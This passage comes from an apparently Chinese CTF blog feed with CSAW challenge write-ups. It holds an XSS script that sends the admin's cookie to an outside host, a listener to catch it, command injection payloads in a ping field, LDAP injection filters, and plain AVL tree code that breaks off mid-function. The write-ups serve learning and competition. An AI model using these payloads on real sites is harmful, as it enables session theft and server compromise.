src="/images/posts/csaw/28.png"><br></div><br>&emsp;&emsp;可以看到代理成功，能够访问到我们的网站。</p><p>&emsp;&emsp;由于CSP中存在<code>script-src *.no.vulnerable.services</code>，所以现在我们能绕过CSP保护了。</p><p>&emsp;&emsp;另外还有一个点就是我们能提交网站内容供他们检查，他们会使用bot去模拟访问。</p><p><div align="center"><br>    <img src="/images/posts/csaw/29.png"><br></div><br>&emsp;&emsp;所以我们在这里填写我们服务器上的恶意脚本，以拿到admin的cookie。使用脚本如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"img"</span>);</span><br><span class="line">img.src = <span class="hljs-string">"http://&#123;hexip&#125;.ip.no.vulnerable.services/?cookie="</span> + <span class="hljs-built_in">encodeURI</span>(<span class="hljs-built_in">document</span>.cookie);</span><br><span class="line"><span class="hljs-built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;将此脚本放到服务器上，然后在report上提交链接：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;//&#123;hexip&#125;.ip.no.vulnerable.services/your.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;为了方便，我这里使用了一个python的简易服务器：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-comment"># Python 3</span></span><br><span class="line">    <span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="hljs-keyword">as</span> test_orig</span><br><span class="line">    <span class="hljs-keyword">import</span> sys</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span> <span class="hljs-params">(*args)</span>:</span></span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">8000</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError: <span class="hljs-comment"># Python 2</span></span><br><span class="line">    <span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="hljs-keyword">from</span> SimpleHTTPServer <span class="hljs-keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyHandler</span><span class="hljs-params">(SimpleHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_GET</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        print(self.headers)</span><br><span class="line">        SimpleHTTPRequestHandler.do_GET(self)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    test(MyHandler, HTTPServer)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;最后我们能收到cookie跟referer。</p><p><div align="center"><br>    <img src="/images/posts/csaw/30.png"><br></div><br>&emsp;&emsp;我带着这里得到的cookie访问<code>http://admin.no.vulnerable.services</code>。可以得到一个页面，源码如下：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>NVS INTERNAL - Admin<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Current Visitors: 672<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Quick links:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"//support.no.vulnerable.services"</span>&gt;</span>Support<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"lb.php"</span>&gt;</span>Load Balancers - BETA<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;其中<code>lb.php</code>是一个负载均衡的监视器：</p><p><div align="center"><br>    <img src="/images/posts/csaw/31.png"><br></div><br>&emsp;&emsp;而<code>support.no.vulnerable.services</code>我们无法访问，如果直接访问<code>http://216.165.2.41/</code>会得到404 Not Found。</p><p>&emsp;&emsp;从<code>lb.php</code>里我们能得知<code>216.165.2.41</code>是代理服务器，所以我们在请求<code>216.165.2.41</code>的时候带上<code>Host</code>头试试。</p><p><div align="center"><br>    <img src="/images/posts/csaw/32.png"><br></div><br>&emsp;&emsp;有回显，但明显被拦截了，那我们再试试另一种访问方式，ping出它的ip，然后用<code>{hexip}.ip.no.vulnerable.services</code>的方式访问。</p><p><div align="center"><br>    <img src="/images/posts/csaw/33.png"><br></div><br>&emsp;&emsp;成功进入，有一个ping的命令执行，所以考虑命令注入。</p><p>&emsp;&emsp;payload1:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1`ls`</span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/csaw/34.png"><br></div><br>&emsp;&emsp;payload2:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1`cat%20flag.txt`</span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/csaw/35.png"><br></div><br>&emsp;&emsp;flag: flag{7672f158167cab32aebc161abe0fbfcaee2868c1}。<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;_&quot;&gt;&lt;/a&gt;_&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;补补web&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CSAW 2018 writeup</title>
    <link href="http://yoursite.com/2018/09/csaw-writeup/"/>
    <id>http://yoursite.com/2018/09/csaw-writeup/</id>
    <published>2018-09-17T08:47:56.000Z</published>
    <updated>2018-11-23T12:42:28.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;很久没活动了，web能力显著下降。。。<br><a id="more"></a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dab</span><br><span class="line"></span><br><span class="line">http://web.chal.csaw.io:8080</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;一直没看懂这道题的提示，打开页面后右上角出现：</p><div align="center"><br>    <img src="/images/posts/csaw/2.png"><br></div><br>&emsp;&emsp;然后有一页人员名单，<code>Here is a list of all users and groups</code>。<br><div align="center"><br>    <img src="/images/posts/csaw/3.png"><br></div><br>&emsp;&emsp;尝试了一波注入后并没有发现突破点，后来经人提示才明白这是<code>LDAP注入</code>。<br><br>&emsp;&emsp;关于LDAP：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">轻量级目录访问协议（LDAP）用于存储有关用户，主机和许多其他对象的信息。LDAP注入是服务器端攻击，可以允许公开，修改或插入有关LDAP结构中表示的用户和主机的敏感信息。这是通过操作输入参数然后传递给内部搜索，添加和修改函数来完成的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Web应用程序可以使用LDAP，以便用户在公司结构中对其他用户的信息进行身份验证或搜索。LDAP注入攻击的目标是在将由应用程序执行的查询中注入LDAP搜索过滤器元字符。</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;LDAP的语法如下：<br><br>| Metachar |   Meaning|<br>|———-|———-|<br>|&amp; |  Boolean AND|<br>| | |  Boolean OR|<br>|! | Boolean NOT|<br>| = |  Equals|<br>| ~= | Approx|<br>| = | Greater than|<br>| &lt;=  | Less than|<br>| *  | Any character|<br>| () |  Grouping parenthesis|<br><br>&emsp;&emsp;所以LDAP表达<code>and</code>需要用<code>(&amp;(condition1)(condition2))</code>，<code>or</code>类似。同时它还支持正则语法主要是：<code>.</code>、<code>*</code>。<br><br>&emsp;&emsp;一些例子：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果我们想要在上面的LDAP结构中查询名为“ steve ”的人，我们的查询将如下所示：</span><br><span class="line">(cn=steve)</span><br><span class="line"></span><br><span class="line">也许我们想要搜索名称以“ s ” 开头的任何成员，那么我们可以使用通配符：</span><br><span class="line">(cn=s*)</span><br><span class="line"></span><br><span class="line">我们还可以使用“ | ”运算符搜索名称以“s”或“t”开头的任何人：</span><br><span class="line">(|(cn=s*)(cn=t*))</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;题目中默认是<code>GivenName</code>，如：<br><div align="center"><br>    <img src="/images/posts/csaw/4.png"><br></div><br>&emsp;&emsp;所以一般来说我们的flag应该就藏在某一项中，我们找一下<code>LDAP attributes</code>，看看其他字段中是否有flag。LDAP属性字段可以在<a href="https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html" target="_blank">这里找到</a>。但都没有发现。使用<code>*)(|(uid=*)</code>列出所有项也还是没有出来。但可以确定的是flag就在这些项中，所以继续尝试，直到找到这个：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*)(uid=*))(|(uid=*</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;得到flag：<br><div align="center"><br>    <img src="/images/posts/csaw/5.png"><br></div><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>&emsp;&emsp;<a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)</a></p><p>&emsp;&emsp;<a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">http://www.4hou.com/technology/9090.html</a></p><p>&emsp;&emsp;<a href="https://www.anquanke.com/post/id/159378" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159378</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="bin-t"><a href="#bin-t" class="headerlink" title="bin_t"></a>bin_t</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Binary trees let you do some interesting things. Can you balance a tree?</span><br><span class="line"></span><br><span class="line">nc misc.chal.csaw.io 9001</span><br><span class="line"></span><br><span class="line">Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如题，nc上去会给出一组数字，而你的任务就是将这组数字转换成<code>平衡二叉树</code>，并且给出该ACL树的前序遍历，下面直接给代码：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//AVL(自动平衡二叉树)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> ElemType;</span><br><span class="line"><span class="hljs-comment">//每个结点的平均值</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">     EH = <span class="hljs-number">0</span>,</span><br><span class="line">     LH = <span class="hljs-number">1</span>,</span><br><span class="line">     RH = <span class="hljs-number">-1</span> </span><br><span class="line">&#125;<span class="hljs-keyword">bh_t</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">      FALSE = <span class="hljs-number">0</span>,</span><br><span class="line">      TRUE = <span class="hljs-number">1</span></span><br><span class="line">&#125;<span class="hljs-keyword">bool_t</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//定义平衡二叉树</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSTNode</span></span></span><br><span class="line"><span class="hljs-class">&#123;</span></span><br><span class="line">     ElemType key;                                <span class="hljs-comment">//平衡值</span></span><br><span class="line">     <span class="hljs-keyword">int</span> bf;                             </span><br><span class="line">     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSTNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span>                </span><br><span class="line">&#125;BSTNode, *BSTree;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//中序遍历</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InOrderTraverse</span><span class="hljs-params">(BSTree root)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != root)</span><br><span class="line">     &#123;</span><br><span class="line">          InOrderTraverse(root-&gt;lchild);</span><br><span class="line">          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\t"</span>,root-&gt;key);</span><br><span class="line">          InOrderTraverse(root-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//前序遍历</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PreOrderTraverse</span><span class="hljs-params">(BSTree root)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != root)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d,"</span>,root-&gt;key);</span><br><span class="line">          PreOrderTraverse(root-&gt;lchild);</span><br><span class="line">          PreOrderTraverse(root-&gt;rchild);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//单向右旋转</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">R_Rotate</span><span class="hljs-params">(BSTree *p)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     BSTree lc=(*p)-&gt;lchild;</span><br><span class="line">     (*p)-&gt;lchild=lc-&gt;rchild;</span><br><span class="line">     lc-&gt;rchild=*p;</span><br><span class="line">     *p=lc;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//单向左旋转</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">L_Rotate</span><span class="hljs-params">(BSTree *p)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     BSTree rc=(*p)-&gt;rchild;</span><br><span class="line">     (*p)-&gt;rchild=rc-&gt;lchild;</span><br><span class="line">     rc-&gt;lchild=*p;</span><br><span class="line">     *p=rc;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//先左旋后右旋平衡旋转</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">LeftBalance</span><span class="hljs-params">(BSTree *T)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    BSTree lc=(*T)-&gt;lchild;</span><br><span class="line">     BSTree rd = lc-&gt;rchild;</span><br><span class="line">     <span class="hljs-comment">//判断进行向哪边旋转</span></span><br><span class="line">    <span class="hljs-keyword">switch</span>(lc-&gt;bf)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="hljs-keyword">case</span> LH:</span><br><span class="line">               (*T)-&gt;bf=lc-&gt;bf=EH;</span><br><span class="line">               R_Rotate(T);</span><br><span class="line">               <span class="hljs-keyword">break</span>;</span><br><span class="line">          <span class="hljs-keyword">case</span> RH:</span><br><span class="line">               <span class="hljs-keyword">switch</span>(rd-&gt;bf)</span><br><span class="line">               &#123;</span><br><span class="line">                <span class="hljs-keyword">case</span> LH:</span><br><span class="line">                     (*T)-&gt;bf=RH;</span><br><span class="line">                     lc-&gt;bf=EH;</span><br><span class="line">                     <span class="hljs-keyword">break</span>;</span><br><span class="line">                <span class="hljs-keyword">case</span> EH:</span><br><span class="line">                     (*T)-&gt;bf=lc-&gt;bf=EH;</span><br><span class="line">                     <span class="hljs-keyword">break</span>;</span><br><span class="line">                <span class="hljs-keyword">case</span> RH:</span><br><span class="line">                     (*T)-&gt;bf=EH;</span><br><span class="line">                     lc-&gt;bf=LH;</span><br><span class="line">                     <span class="hljs-keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           rd-&gt;bf=EH;</span><br><span class="line">           L_Rotate(&amp;((*T)-&gt;lchild));</span><br><span class="line">           R_Rotate(T);</span><br><span class="line">           <span class="hljs-keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//先右旋后左旋平衡旋转</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RightBalance</span><span class="hljs-params">(BSTree *T)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     BSTree rc=(*T)-&gt;rchild;</span><br><span class="line">     BSTree ld=rc-&gt;lchild;</span><br><span class="line">     <span class="hljs-keyword">switch</span>(rc-&gt;bf)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="hljs-keyword">case</span> RH:</span><br><span class="line">               (*T)-&gt;bf=rc-&gt;bf=EH;</span><br><span class="line">               L_Rotate(T);</span><br><span class="line">               <span class="hljs-keyword">break</span>;</span><br><span class="line">          <span class="hljs-keyword">case</span> LH:</span><br><span class="line">               <span class="hljs-keyword">switch</span>(ld-&gt;bf)</span><br><span class="line">               &#123;</span><br><span class="line">                <span class="hljs-keyword">case</span> RH:</span><br><span class="line">     (*T)-&gt;bf=LH;</span><br><span class="line">     rc-&gt;bf=EH;</span><br><span class="line">     <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> EH:</span><br><span class="line">     (*T)-&gt;bf=rc-&gt;bf=EH;</span><br><span class="line">     <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> LH:</span><br><span class="line">     (*T)-&gt;bf=EH;</span><br><span class="line">     rc-&gt;bf=RH;</span><br><span class="line">     <span class="hljs-keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   ld-&gt;bf=EH;</span><br><span class="line">   R_Rotate(&amp;((*T)-&gt;rchild));</span><br><span class="line">   L_Rotate(T);</span><br><span class="line">   <span class="hljs-keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">//插入元素</span></span><br><span class="line"><span class="hljs-keyword">bool_t</span> InsertAVL(BSTree *t,ElemType e,<span class="hljs-keyword">bool_t</span> *taller)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> == t)</span><br><span class="line">          <span class="hljs-keyword">return</span> FALSE;</span><br><span class="line">     <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> == *t)</span><br><span class="line">     &#123;</span><br><span class="line">          *t=(BSTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BSTNode));</span><br><span class="line">          <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> == *t)</span><br><span class="line">               <span class="hljs-keyword">return</span> FALSE;</span><br><span class="line">          (*t)-&gt;key=e;</span><br><span class="line">          (*t)-&gt;lchild=(*t)-&gt;rchild=<span class="hljs-literal">NULL</span>;</span><br><span class="line">          (*t)-&gt;bf=EH;</span><br><span class="line">          *taller=TRUE;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="hljs-keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">          <span class="hljs-keyword">if</span>(e==(*t)-&gt;key)</span><br><span class="line">          &#123;</span><br><span class="line">               *taller=FALSE;</span><br><span class="line">               <span class="hljs-keyword">return</span> 